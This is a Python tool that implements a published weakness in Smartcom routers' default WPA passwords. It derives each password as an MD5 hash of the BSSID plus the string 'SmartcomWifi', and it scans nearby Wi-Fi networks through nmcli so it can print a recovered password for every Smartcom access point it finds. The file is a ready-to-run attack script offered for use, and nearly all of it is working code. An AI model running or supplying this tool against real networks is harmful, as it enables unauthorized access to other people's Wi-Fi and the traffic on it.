"""https://sec.stanev.org/advisories/Smartcom_default_WPA_password.txt"""

from argparse import ArgumentParser, Namespace
from dataclasses import dataclass
from hashlib import md5
from io import BytesIO
from subprocess import check_output

from pandas import read_fwf
from rich import print as rprint


@dataclass
class MyNamespace(Namespace):
    bssid: str | None


arg_parser = ArgumentParser()
_ = arg_parser.add_argument("bssid", nargs="?", help="BSSID like A1:B2:C3:D4:E5:F6")
args = arg_parser.parse_args(namespace=MyNamespace)


BSSID_LEN = 12
SERIAL_OFFSET = 4
PASSWORD_LEN = 8
SMARTCOM_PREFIX = "50a9de"


def normalize_bssid(bssid: str) -> str:
    bssid = bssid.lower().replace(":", "")

    if len(bssid) != BSSID_LEN:
        raise ValueError("Invalid BSSID size.")

    return bssid


def md5sum(data: bytes | str) -> str:
    if isinstance(data, str):
        data = data.encode("ascii")

    return md5(data).hexdigest()


def smartcom_password(bssid: str) -> str:
    bssid = normalize_bssid(bssid)

    if not bssid.startswith(SMARTCOM_PREFIX):
        raise NotImplementedError("Only Smartcom BSSIDs are supported.")

    preimage = f"{bssid[SERIAL_OFFSET:]}SmartcomWifi"
    preimage_md5 = md5sum(preimage)

    return preimage_md5[:PASSWORD_LEN]


if args.bssid:
    password = smartcom_password(args.bssid)
    rprint(f"{args.bssid}: {password}")
    raise SystemExit(0)


wifi_list = check_output("nmcli device wifi list".split())
if len(wifi_list) == 0:
    rprint("[red]No output from [i]NetworkManager[/i].")
    rprint("[red]Is there a wireless interface available?")
    exit(1)


wifi_df = read_fwf(BytesIO(wifi_list))
wifi_df["BSSID"] = wifi_df["BSSID"].apply(normalize_bssid)

if not (potential_count := len(wifi_df)):
    rprint("[red]No Wi-Fi networks found. Check if Wi-Fi is enabled.")
    exit(1)

smartcom_df = wifi_df[wifi_df["BSSID"].str.startswith(SMARTCOM_PREFIX)]

if not (targets := len(smartcom_df)):
    rprint(f"Found {potential_count} potential Wi-Fi networks.")
    rprint("[red]No Smartcom networks found.")
    exit(1)

rprint(f"[green]{targets} Smartcom network(s) out of {len(wifi_df)} Wi-Fi network(s).")

for row in smartcom_df.to_dict(orient="records", into=dict[str, str]()):
    password = smartcom_password(row["BSSID"])
    rprint(f"{row['SSID']}: {password} ({row['BARS']})")
